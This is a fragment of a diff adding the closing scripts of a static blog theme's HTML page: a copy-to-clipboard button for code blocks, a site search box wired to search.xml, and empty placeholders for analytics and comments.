+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
